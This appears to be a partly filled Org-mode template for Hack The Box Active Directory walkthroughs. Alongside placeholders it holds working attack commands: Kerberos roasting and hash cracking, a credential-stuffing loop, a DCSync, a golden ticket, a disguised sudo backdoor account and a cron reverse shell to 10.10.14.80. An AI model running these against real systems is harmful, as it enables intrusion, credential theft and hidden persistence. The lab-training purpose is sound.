@@ -1,0 +1,838 @@
+#+filetags: :Box:HTB:Easy:Windows:LDAP:ActiveDirectory:
+#+HUGO_BASE_DIR: ~/Dropbox/40-49_Career/44-Blog/bloodstiller
+#+HUGO_SECTION:
+#+hugo_custom_front_matter: :draft true
+#+hugo_custom_front_matter: :title "<bx> HTB Walkthrough"
+#+hugo_custom_front_matter: :author bloodstiller
+#+hugo_custom_front_matter: :date 2025-01-14
+:HIDDEN:
+#+STARTUP: overview
+#+STARTUP: hidestars
+#+STARTUP: indent
+#+STARTUP: entitiespretty
+#+STARTUP: inlineimages
+#+OPTIONS: H:4 toc:nil num:nil \n:nil ':nil *:t -:t ::t <:t ^:{} _:{} |:t f:t d:nil
+#+OPTIONS: tex:mathjax tags:not-in-toc tasks:t title:nil
+#+COLUMNS: %80ITEM %TAGS %TODO %SCHEDULED
+#+TODO: TODO(t) IN-PROGRESS(i) NOTES(m) RABBITHOLE!(R) | DONE(d!) HOLD(h) WONT-DO(n)
+:END:
+
+
+* <bx> Hack The Box Walkthrough/Writeup:
+:PROPERTIES:
+:ID:       e3f25c99-179f-461d-9310-dd1f026d4ec1
+:END:
+- https://app.hackthebox.com/machines/<bx>
+
+* How I use variables & Wordlists:
+:PROPERTIES:
+:ID:       807d55ef-43ab-462f-9307-7d03330b72d2
+:END:
+- *Variables*:
+  - In my commands you are going to see me use ~$box~, ~$user~, ~$hash~, ~$domain~, ~$pass~ often.
+    - I find the easiest way to eliminate type-os & to streamline my process it is easier to store important information in variables & aliases.
+      - ~$box~ = The IP of the box
+      - ~$pass~ = Passwords I have access to.
+      - ~$user~ = current user I am enumerating with.
+        - Depending on where I am in the process this can change if I move laterally.
+      - ~$domain~ = the domain name e.g. ~sugarape.local~ or ~contoso.local~
+      - ~$machine~ = the machine name e.g. ~DC01~
+    - Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
+
+- *Wordlists*:
+
+  - I have symlinks all setup so I can get to my passwords from ~~/Wordlists~ so if you see me using that path that's why. If you are on Kali and following on, you will need to go to ~/usr/share/wordlists~
+    - I also use these additional wordlists:
+      - [[https://github.com/insidetrust/statistically-likely-usernames][Statistically-likely-usernames]]
+      - [[https://github.com/danielmiessler/SecLists][SecLists]]
+      - [[https://github.com/carlospolop/Auto_Wordlists][Auto_Wordlists]]
+* 1. Enumeration:
+:PROPERTIES:
+:ID:       df114f61-f09f-46bc-a9d0-e1e62bf4d249
+:END:
+** Assumed Breach Box:
+:PROPERTIES:
+:ID:       8fdc027e-d7a4-4f54-9c83-4b9d26aa1453
+:END:
+- This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.
+- This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.
+  - *User*:
+  - *Pass*:
+- +Note+:
+  - Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them.
+    - This ensures I don’t overlook any findings just because access is available.
+    - Comprehensive documentation of all discoveries remains essential.
+** NMAP:
+:PROPERTIES:
+:ID:       0d42892c-fad3-4440-834b-6ebf6c6f41c3
+:END:
+*** Basic Scans:
+:PROPERTIES:
+:ID:       13dd3494-95f0-4c4b-b6b8-85ce11fff991
+:END:
++ *Basic TCP Scan*:
+  #+begin_src shell
+#Command
+nmap $box -Pn -oA TCPbasicScan
+
+#Results
+    #+end_src
+  - *Initial thoughts*:
+
++ *Basic UDP Scan*:
+  #+begin_src shell
+#Command
+sudo nmap $box -sU -Pn -oA UDPbasicScan
+
+#Results
+  #+end_src
+  - *Initial thoughts*:
+
+*** Comprehensive Scans:
+:PROPERTIES:
+:ID:       38e2ad58-d516-494e-bb6e-0003582ce978
+:END:
++ *In depth scan TCP*:
+  #+begin_src shell
+#Command
+sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+
+#Results
+  #+end_src
+  - *Findings*:
+
++ *In depth scan UDP*:
+  #+begin_src shell
+#Command
+sudo nmap -p- -sU -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+
+#Results
+  #+end_src
+  - *Findings*:
+
+** LDAP ~389~:
+:PROPERTIES:
+:ID:       6a27f462-51f8-437a-9357-004faa093013
+:END:
+*** Using LDAP anonymous bind to enumerate further:
+:PROPERTIES:
+:ID:       558ffa34-2558-47bc-8f37-e1674d74d810
+:END:
+- If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
+  - We can actually retrieve a significant amount of information via anonymous bind such as:
+    - A list of all users
+    - A list of all groups
+    - A list of all computers.
+    - User account attributes.
+    - The domain password policy.
+    - Enumerate users who are susceptible to AS-REPRoasting.
+    - Passwords stored in the description fields
+  - The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
+
+- I actually have a handy script to check if anonymous bind is enabled & if it is to dump a large amount of information. You can find it here
+  - https://github.com/bloodstiller/ldapire
+  - https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb
+    - ~python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass~
+      - It will dump general information & also detailed & simple information including:
+        - Groups
+        - Computers
+        - Users
+        - All domain objects
+        - A file containing all description fields
+        - It will also search the domain for any service/svc accounts and place them in a folder too.
+
+
+  A) _We have the naming context of the domain_:
+       #+begin_src shell
+kali in HTB/BlogEntriesMade/Forest/scans/ldap  🍣 main 📝 ×143🗃️  ×3🛤️  ×113 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+🕙 08:32:01 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box
+
+------------------------------------------------------------
+ Server Information
+------------------------------------------------------------
+  • IP Address  : 10.129.95.210
+  • Domain Name : htb.local
+  • Server Name : FOREST
+  • Forest Level: 7
+  • Domain Level: 7
+
+    #+END_SRC
+
+- It turns out the anonymous bind is (+NOT+) enabled and we get the below information.
+
+  #+begin_src shell
+------------------------------------------------------------
+ Connection Attempts
+------------------------------------------------------------
+  • Attempting SSL connection...
+  ✗ Failed to connect with SSL
+  • Attempting non-SSL connection...
+  ✓ Connected successfully using anonymous bind
+
+------------------------------------------------------------
+ Security Warning
+------------------------------------------------------------
+  ⚠️  WARNING: Connected using Anonymous Bind
+  ⚠️  This is a security risk and should be disabled
+  #+end_src
+
+  B) _We have the domain functionality level_:
+      #+begin_src shell
+  • Forest Level: 7
+  • Domain Level: 7
+      #+end_src
+     - The functionality level determines the minimum version of Windows server that can be used for a DC.
+       - +Note+: that any host os can be used on *workstations*, however the functionality level determines what the minimum version for DC's and the forest.
+       - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels
+       - Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.
+
+       - In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
+       - Here’s a list of functional level numbers and their corresponding Windows Server operating systems:
+
+         | Functional Level Number | Corresponding OS            |
+         |                       0 | Windows 2000                |
+         |                       1 | Windows Server 2003 Interim |
+         |                       2 | Windows Server 2003         |
+         |                       3 | Windows Server 2008         |
+         |                       4 | Windows Server 2008 R2      |
+         |                       5 | Windows Server 2012         |
+         |                       6 | Windows Server 2012 R2      |
+         |                       7 | Windows Server 2016         |
+         |                       8 | Windows Server 2019         |
+         |                       9 | Windows Server 2022         |
+
+         - +Note+:
+           - Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
+           - As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.
+
+  C) _We have the full server name & domain name_:
+       #+begin_src shell
+------------------------------------------------------------
+ Server Information
+------------------------------------------------------------
+  • IP Address  : 10.129.95.210
+  • Domain Name : htb.local
+  • Server Name : FOREST
+       #+end_src
+- It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
+  + We have the naming context.
+  + Domain name.
+
+- The script also has created several files with various amounts on information lets examine those.
+  #+begin_src shell
+------------------------------------------------------------
+ Processing Users
+------------------------------------------------------------
+[+] Detailed results written to UsersDetailed.txt
+[+] Basic names written to Users.txt
+  ✓ Basic user names    → Users.txt
+  ✓ Detailed user info  → UsersDetailed.txt
+
+------------------------------------------------------------
+ Processing Groups
+------------------------------------------------------------
+[+] Groups written to GroupsDetailed.txt
+[+] Basic names written to Groups.txt
+  ✓ Basic group names   → Groups.txt
+  ✓ Detailed group info → GroupsDetailed.txt
+
+------------------------------------------------------------
+ Processing Computers
+------------------------------------------------------------
+[+] Computers written to ComputersDetailed.txt
+[+] Basic names written to Computers.txt
+  ✓ Basic computer names    → Computers.txt
+  ✓ Detailed computer info  → ComputersDetailed.txt
+
+------------------------------------------------------------
+ Processing All Objects
+------------------------------------------------------------
+[+] Detailed results written to ObjectsDetailedLdap.txt
+[+] Basic names written to Objects.txt
+  ✓ Basic object names     → Objects.txt
+  ✓ Detailed object info   → ObjectsDetailedLdap.txt
+
+------------------------------------------------------------
+ Processing Descriptions
+------------------------------------------------------------
+[+] All descriptions written to AllObjectDescriptions.txt
+  ✓ All object descriptions → AllObjectDescriptions.txt
+  #+end_src
+
+It will also check for any service accounts and write them to a file:
+#+begin_src shell
+-----------------------------------------------------------
+ Searching for Service Accounts
+------------------------------------------------------------
+  🔍 Searching Users.txt
+  - No matches in Users.txt
+  🔍 Searching UsersDetailed.txt
+  ✓ Found matches in UsersDetailed.txt
+  🔍 Searching Groups.txt
+  ✓ Found matches in Groups.txt
+  🔍 Searching GroupsDetailed.txt
+  ✓ Found matches in GroupsDetailed.txt
+  🔍 Searching Objects.txt
+  ✓ Found matches in Objects.txt
+  🔍 Searching ObjectsDetailedLdap.txt
+  ✓ Found matches in ObjectsDetailedLdap.txt
+  🔍 Searching AllObjectDescriptions.txt
+  ✓ Found matches in AllObjectDescriptions.txt
+
+  ✓ Service account findings written to ServiceAccounts.txt
+  ✓ Found 646 potential matches
+
+#+end_src
+
+*** Checking the objects file:
+:PROPERTIES:
+:ID:       0077a4d6-6b97-4478-880f-6755a72bdcf8
+:END:
+
+*** Searching the descriptions file for any passwords:
+:PROPERTIES:
+:ID:       a96cef40-b1e9-4c49-870c-6cf2a94db795
+:END:
+
+*** Checking the users file:
+:PROPERTIES:
+:ID:       f7356e49-b6c1-496f-8ae3-497c114b0469
+:END:
+
+*** Finding an unlisted service account svc-alfresco:
+:PROPERTIES:
+:ID:       41c9ab86-d11f-4e08-848f-2a2c1bf9adad
+:END:
+*** Updating ETC/HOSTS & Variables:
+:PROPERTIES:
+:ID:       70c39e1a-91a2-4102-898c-d195b5b42155
+:END:
+- *Updated Domain & Machine Variables for Testing*:
+  - Now that I have this information, I can update the ~domain~ and ~machine~ variables used in tests:
+    #+begin_src shell
+update_var domain "sequel.htb"
+update_var machine "DC01"
+    #+end_src
+
+- *Updating* ~/etc/hosts~ *for DNS and LDAP Queries*:
+  - I update my ~/etc/hosts~ file to enable tools like [[https://github.com/ropnop/kerbrute][kerbrute]] for user enumeration and other tools that require DNS or LDAP for queries:
+    #+begin_src shell
+sudo echo "$box   $domain $machine.$domain $machine" | sudo tee -a /etc/hosts
+    #+end_src
+*** Syncing Clocks for Kerberos Exploitation:
+:PROPERTIES:
+:ID:       d2509b2d-ec58-4483-9d01-3915d8957dc8
+:END:
+- Since Kerberos is enabled on this host, it's best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
+  - ~sudo ntpdate -s $domain~
+  - +Note+: I am doing this now as we have the DNS name etc.
+
+** DNS ~53~:
+:PROPERTIES:
+:ID:       72e6c6aa-a991-4b59-8a1d-9c1967f71edb
+:END:
+- *Using dnsenum to enumerate DNS entries*:
+  #+begin_src shell
+dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain
+  #+end_src
+** Kerberos ~88~:
+:PROPERTIES:
+:ID:       1a19d7f9-b46c-44e4-902f-dbeb85742df5
+:END:
+*** Using [[https://github.com/ropnop/kerbrute][Kerbrute]] to bruteforce Usernames:
+:PROPERTIES:
+:ID:       e9be28c8-168a-48a0-8bc2-f467a8ae3ed8
+:END:
+- Normally I would do this but as we have creds I will skip it as we casn use other authenticated methods.
+  #+begin_src shell
+kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt
+  #+end_src
+
+*** Using netexec for ASReproasting:
+:PROPERTIES:
+:ID:       e5a47469-3aba-4334-b729-d3297a3a46eb
+:END:
+- *We should always try and asreproast with a null/guest session as it can lead to an easy win*:
+  #+begin_src shell
+netexec ldap $box -u '' -p '' --asreproast asrep.txt
+netexec ldap $box -u $user -p $pass --asreproast asrep.txt
+netexec ldap $box -u guest -p '' --asreproast asrep.txt
+
+
+# This one will just work, without having to pass anything else.
+impacket-GetNPUsers $domain/ -request
+impacket-GetNPUsers $domain/ -dc-ip $box -usersfile Users.txt -format hashcat -outputfile asRepHashes.txt -no-pass
+
+  #+end_src
+
+- *Cracking ASREP ticket*:
+  #+begin_src shell
+#Cracking
+hashcat -m 18200 asrep.txt ~/Wordlists/rockyou.txt
+  #+end_src
+*** Using netexec for Kerberoasting:
+:PROPERTIES:
+:ID:       3992f7e0-c753-4387-bfa6-86587f4837b2
+:END:
+- *As we have creds we can kerberoast*:
+  #+begin_src shell
+netexec ldap $box -u $user -p $pass --kerberoast kerb.txt
+  #+end_src
+
+- *Cracking Kerberos ticket*:
+  #+begin_src shell
+#Cracking
+hashcat -m 13100 kerb.txt ~/Wordlists/rockyou.txt
+  #+end_src
+** SMB ~445~:
+:PROPERTIES:
+:ID:       4f2c7ccb-eaa6-4a32-95c4-87545fd949d6
+:END:
+*** Attempting to connect with NULL & Guest sessions:
+:PROPERTIES:
+:ID:       fc63ee15-d711-4a53-818d-b4138791f6e4
+:END:
+- *This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold*:
+  #+begin_src shell
+netexec smb $box -u 'guest' -p '' --shares
+netexec smb $box -u '' -p '' --shares
+  #+end_src
+- +Note+: We can see the build number is +Insert-Build+ We can now enumerate that.
+
+*** Trying Usernames as Passwords:
+:PROPERTIES:
+:ID:       51b5cc92-1537-42c7-9e51-a41685758ef6
+:END:
+- *I always try usernames as passwords as well*:
+  #+begin_src shell
+netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]
+  #+end_src
+
+*** Enumerating SMB shares using netexec:
+:PROPERTIES:
+:ID:       607e444e-1d02-4b99-98a2-3475593e2cd8
+:END:
+#+begin_src shell
+netexec smb $box -u $user -p $pass --shares
+#+end_src
+
+*** Using smbclient:
+:PROPERTIES:
+:ID:       57c70b81-c003-468c-954f-add9c67c22fb
+:END:
+#+begin_src shell
+smbclient -U 'guest' "\\\\$box\\[Share]"
+smbclient -U $domain\\$user "\\\\$box\\[Share]"
+
+#+end_src
+*** Enumerating Users with Impacket-lookupsid:
+:PROPERTIES:
+:ID:       edf3f6be-05e3-4dcf-ab38-7b228174cd29
+:END:
+- *We can use* ~impacket-lookupsid~ *to enumerate users on the domain*:
+  #+begin_src shell
+impacket-lookupsid $domain/guest@$machine.$domain -domain-sids
+impacket-lookupsid guest@$box -domain-sids -no-pass
+  #+end_src
+  - +Note+: As we are using the "Guest" account we can just hit enter for a blank password
+** Web ~80~:
+:PROPERTIES:
+:ID:       3d2c1bfb-771f-436a-b766-aa8244a9a430
+:END:
+- *Web Enumeration via Burp Suite*:
+  - When enumerating a Website, always use Burp Suite. This allows you to:
+  - Record all potential injection points.
+  - Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.
+*** WhatWeb:
+:PROPERTIES:
+:ID:       bfd1375c-71d8-4cf6-a5a2-712ccfc6acc2
+:END:
+- Lets run "whatWeb" to see if I can glean some further information:
+  #+begin_src shell
+#Command
+whatweb http://$box | sed 's/, /\n/g'
+
+#Output
+  #+end_src
+  - *Results*:
+  - +Note+: I use sed to put the output across multiple lines for a nicer output.
+*** Dirbusting The Webserver Running Using ferox:
+:PROPERTIES:
+:ID:       c072eb49-fe77-44ca-ba52-793d304b1922
+:END:
++ I Perform some directory busting to see if there are any interesting directories:
+  #+begin_src shell
+#Command
+feroxbuster -u http://$box:80 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt
+
+#Result
+  #+end_src
+  + *Some notes on my flags*:
+    - ~--threads 20 --scan-limit 2~ I limit the threads & scan limit as otherwise it effectively DDOS’ the site.
+    - ~-q~ As I run tmux for most sessions, this quiet flag removes the progress bar and is advised when using tmux etc.
+    - ~-r~ Follows redirects.
+    - ~-o $domain-FeroxScan.txt~ sometimes there can be ALOT of output so this makes it more manageable to go through later.
+*** Enumerating Injection Points:
+:PROPERTIES:
+:ID:       3694d9cd-6c79-4c49-af58-6f06c214c73e
+:END:
+
+** RPC:
+:PROPERTIES:
+:ID:       224bdc39-b44b-4c8c-a54b-128716a6f5fa
+:END:
+- *As we have valid credentials we can also connect to RPC to enumerate further*:
+  #+begin_src shell
+# Guest Session
+rpcclient -U $user%$pass $box
+  #+end_src
+- +Cheatsheet+: I have an enumeration & attacking cheatsheet for RPC, available here:
+  - https://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient
+
+- *Null session via RPC*:
+  - Much like SMB you can also connect to RPC via null & guest sessions, let's see if they are valid here:
+    #+begin_src shell
+# Guest Session
+rpcclient -U "" $box
+# Null Session:
+rpcclient -U '%' $box
+
+# Loop to cred stuff
+while IFS= read -r user; do
+    while IFS= read -r pass; do
+        echo "trying Username: $user with Password: $pass $box \n"
+        rpcclient -U "$user%$pass" "$box"
+    done < Passwords.txt
+done < Users.txt
+
+    #+end_src
+*** Enumerating domain users via RPC:
+:PROPERTIES:
+:ID:       5f636d7c-754a-4422-86e5-d2c6f29cd141
+:END:
+- *We can enumerate all the users of the domain via RPC*:
+  - ~enumdomusers~
+
+- *Querying individual users*:
+  - Once we have the RID's as displayed above we can enumerate each user further. This is useful to discover if they have anything interesting in their "Description fields etc"
+  - ~queryuser [RID]~
+*** Enumerating groups via RPC:
+:PROPERTIES:
+:ID:       7f587aa4-d279-42fb-a234-707b295df4ed
+:END:
+- *We can also enumerate groups*:
+  - ~enumdomgroups~
+
+- *Querying individual groups*:
+  - Once we have the RID's as displayed above we can enumerate each group further. Just like we did with users.
+  - ~querygroup [RID]~
+** Searching for known vulnerabilities for the Windows Build number:
+:PROPERTIES:
+:ID:       0991a49e-2991-42c8-b77c-d903ac1cbd62
+:END:
++ As we were able to retrieve the build number from netexec we can enumerate for known vulnerabilities.
++ *Search the Microsoft Knowledge Base ID Number in the Microsoft Catalog*:
+  - https://www.catalog.update.microsoft.com/home.aspx
+  - https://www.catalog.update.microsoft.com/Search.aspx?q=KB4601056
+  - +Note+:
+    - We can determine how far behind the machine is on it's security updates by checking the above page.
++ Check https://msrc.microsoft.com/update-guide/vulnerability for vulns
+** Performing a Bloodhound Collection:
+:PROPERTIES:
+:ID:       7c53790f-a1aa-4745-83ea-c2dc7d68eeff
+:END:
+- I use bloodhound-python to perform a collection.
+  #+begin_src shell
+bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
+  #+end_src
+  - I then import these into bloodhound for investigation.
+** Bloodhound Findings:
+:PROPERTIES:
+:ID:       dc2899ba-7561-4a58-a53b-68d7bd2c7a65
+:END:
+
+- How many domain admins:
+
+- What users have DC Sync Privileges:
+
+- Our users rights:
+
+- How many users in the domain:
+
+- Interesting user:
+
+** Enumerating The CA Using Certipy-ad:
+:PROPERTIES:
+:ID:       9216e814-0228-4f9d-8c16-5fd5cfdc5413
+:END:
+#+begin_src shell
+certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
+#+end_src
+* 2. Foothold:
+:PROPERTIES:
+:ID:       12cad379-c0d0-4c07-8b2c-28440c2582cf
+:END:
+1.
+* 3. Privilege Escalation:
+:PROPERTIES:
+:ID:       d9e6b559-a369-42b5-92da-4ccd104efb1c
+:END:
+1.
+* 4. Persistence:
+:PROPERTIES:
+:ID:       37a8061a-df18-452e-a13a-025297fb661f
+:END:
+** Dumping NTDS.dit/DCSync attack:
+:PROPERTIES:
+:ID:       43858f16-d1b9-48be-a790-bfbd13b17275
+:END:
+- *Perform DCSync attack using netexec*:
+  #+begin_src
+netexec smb $box -u administrator --use-kcache -M ntdsutil
+  #+end_src
+
+- *Extract all hashes from netexec*
+  #+begin_src shell
+for file in /home/kali/.nxc/logs/*.ntds; do cat "$file" | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\n'; done
+  #+end_src
+
+** Creating a Kerberos Golden Ticket:
+:PROPERTIES:
+:ID:       7e540f36-bd29-450a-a2af-b11be5822f4d
+:END:
+
++ *Using* ~impacket-lookupsid~ *to get the Search for the Domain SID*:
+  #+begin_src shell
+impacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass
+  #+end_src
+  - I store this in the variable ~$sid~
+
++ *Using* ~impacket-secretsdump~ *to retrieve the* ~aeskey~ *of the* ~krbtgt~ *account*:
+  #+begin_src shell
+impacket-secretsdump $domain/$user:$pass@$box
+impacket-secretsdump $domain/$user@$box -hashes :$hash
+impacket-secretsdump $domain/$user:$pass@$box
+  #+end_src
+  - I store ~krbtgt:aes256~ value in the variable ~$krbtgt~
+
++ *Sync our clock to the host using ntpdate*:
+  #+begin_src shell
+#Using ntpdate
+sudo ntpdate -s $domain
+
+#Using faketime
+faketime "$(ntpdate -q $domain | cut -d ' ' -f 1,2)"
+  #+end_src
+
++ *Using* ~impacket-ticketer~ *to create the Golden Ticket*:
+
++ *Using* ~impacket-ticketer~ *to create the Golden Ticket*:
+  #+begin_src shell
+#Using -nthash
+impacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator
+#Using -aeskey
+impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator
+  #+end_src
+
++ *Export the ticket to the* ~KRB5CCNAME~ *Variable*:
+  #+begin_src shell
+export KRB5CCNAME=./Administrator.ccache
+  #+end_src
+
++ *Use the ticket for connecting via* ~psexec~
+  #+begin_src shell
+impacket-psexec -k -no-pass $machine.$domain
+  #+end_src
+
+*** Why create a golden ticket?
+:PROPERTIES:
+:ID:       5a887352-90e5-435b-9d34-06b32b32d0a5
+:END:
+- "But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:
+  - Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:
+  - ~KRBTGT~ *Hash Dependence*:
+    - Golden Tickets are generated using the ~KRBTGT~ account hash from the target’s domain controller.
+    - Unlike user account passwords, ~KRBTGT~ hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely.
+  - ~KRBTGT~ *Hash—The Key to It All (for upto 10 years)*:
+    - A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.
+    - This makes it a reliable backdoor, especially if re-access is needed long after initial entry.
+    - *Think about it*: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the ~KRBTGT~ account, not individual users.
+** Creating a high privileged "service" account for persistence:
+:PROPERTIES:
+:ID:       c5be79bb-3854-41d3-8d79-a9de8313fd6e
+:END:
+- I create an account called "nginx" and give myself root privileges & access to the bash shell. I use this name as it's one you could see on a machine and will raise less suspicion.
+
+- [[file:screenshots/2024-12-22-090631_.png]]
+  - ~sudo useradd -m -s /bin/bash nginx~
+    - Creates a new user named ~nginx~.
+    - ~-m~: Creates a home directory for the user.
+    - ~-s /bin/bash~: Sets the user's default shell to ~/bin/bash~.
+
+  - ~sudo usermod -aG sudo nginx~
+    - Adds the ~nginx~ user to the ~sudo~ group.
+    - ~-a~: Appends the user to the group (avoids overwriting existing groups).
+    - ~-G sudo~: Specifies the ~sudo~ group.
+
+  - ~sudo passwd nginx~
+    - Sets or updates the password for the ~nginx~ user.
+    - Prompts us to add a new password and confirms it.
+
+- I switch to the newly created user
+  - [[file:screenshots/2024-12-22-090700_.png]]
+
+- I check we have sudo privileges, as expected we do.
+  - [[file:screenshots/2024-12-22-090731_.png]]
+
+- I ensure we can actually read sudo level files by reading ~/etc/shadow~
+  - [[file:screenshots/2024-12-22-090801_.png]]
+** Creating a cron job reverse shell:
+:PROPERTIES:
+:ID:       ee9f0d50-4786-40a5-a421-d96af959a911
+:END:
+  #+begin_src shell
+(crontab -l > .tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.80/80 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
+  #+end_src
+- [[file:screenshots/2024-12-21-075648_.png]]
+
+- Let's verify it's in the crontab by running ~crontab -l~
+  - [[file:screenshots/2024-12-21-075743_.png]]
+  - As we can see it's running.
+
+- I start my listener and get a connection back after 1 minute.
+  - [[file:screenshots/2024-12-21-075844_.png]]
+
+- +Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.
+
+** Adding an SSH key:
+:PROPERTIES:
+:ID:       cf55928c-d23e-43d1-9c61-af65748d27ca
+:END:
++ So typically what we could do is make a new user, however I am going to generate a key for the root user we already have access too.
+
+- *Generate SSH Key for the User*:
+   #+begin_src shell
+ssh-keygen -t rsa -b 4096
+   #+end_src
+  - [[file:screenshots/2024-12-21-080723_.png]]
+
+- *Copy Public Key to Authorized Keys*:
+  #+begin_src shell
+cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
+  #+end_src
+  - This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user.
+  - [[file:screenshots/2024-12-21-080801_.png]]
+
+- *Copy Private key to attack machine*:
+  #+begin_src shell
+cat id_rsa
+  #+end_src
+  - [[file:screenshots/2024-12-21-080902_.png]]
+
+- *Change the mode of the key so the permissions are not too open*:
+  #+begin_src shell
+sudo chmod 400 id_rsa
+  #+end_src
+
+- *Verify it works*:
+  #+begin_src shell
+ssh -i id_rsa root@$box
+  #+end_src
+- [[file:screenshots/2024-12-21-081007_.png]]
+* Lessons Learned:
+:PROPERTIES:
+:ID:       2c027237-8833-4750-a7e7-4282b86b6b75
+:END:
+** What did I learn?
+:PROPERTIES:
+:ID:       6fe78ec6-f538-4653-a4de-987388927bb7
+:END:
+  1.
+  2.
+  3.
+** What silly mistakes did I make?
+:PROPERTIES:
+:ID:       9c617b79-9173-496c-a4eb-7d43fb807aee
+:END:
+  1.
+  2.
+
+* Sign off:
+:PROPERTIES:
+:ID:       52ccdf4f-ff0e-405d-aa9b-42ea204b741b
+:END:
+
+Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!
+
+Until next time, hack the planet!
+
+-- Bloodstiller
+
+-- Get in touch bloodstiller at bloodstiller dot com
+
+* +CREDS+:
+:PROPERTIES:
+:ID:       6c2b5bb7-14bf-4c0d-8b05-2f25e346f0c6
+:END:
+** Compiled Usernames, Passwords & Hashes:
+:PROPERTIES:
+:ID:       4f5a86e1-5b54-49c8-a9be-b5e20e3f63bd
+:END:
+*** Usernames:
+:PROPERTIES:
+:header-args: :tangle Users.txt :mkdirp yes :perms
+:ID:       70c0d96c-a165-436a-984f-d6c3518b9eaf
+:END:
+#+begin_src text
+Administrator
+Guest
+Root
+krbtgt
+Admin
+#+end_src
+
+*** Passwords:
+:PROPERTIES:
+:header-args: :tangle Passwords.txt :mkdirp yes :perms
+:ID:       15f28104-49ee-43ab-8b58-599d79233039
+:END:
+#+begin_src text
+
+#+end_src
+
+*** Email Names:
+:PROPERTIES:
+:header-args: :tangle Emails.txt :mkdirp yes :perms
+:ID:       6f5c0eaa-5976-4347-874e-399a302eed66
+:END:
+
+#+begin_src text
+#+end_src
+*** Username & Pass:
+:PROPERTIES:
+:ID:       c1b57e7a-7037-43ab-9082-4f173be9323f
+:END:
+#+begin_src text
+
+#+end_src
+
+
+*** Hashes:
+:PROPERTIES:
+:header-args: :tangle Hashes.txt :mkdirp yes :perms
+:ID:       efdd9b2b-1a20-40d7-b99c-eac4b22b1f0a
+:END:
+- *Extract all hashes from netexec*
+  - *Extract only enabled hashes*:
+    - ~grep -iv disabled /home/kali/.nxc/logs/*.ntds | cut -d ':' -f2,5 --output-delimiter=' ' | awk '{print $2, $1}'~
+  - *Extract all hashes*
+    - ~cat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'~
+    - +Note+: We need to include disabled hashes to get the krbtgt hash in this method as that account is disabled by default.
+
+#+begin_src text
+#+end_src
+
+** SSH Keys:
+:PROPERTIES:
+:ID:       a7494955-ab6b-4500-8d5d-e3fb9ef341bf
+:END:
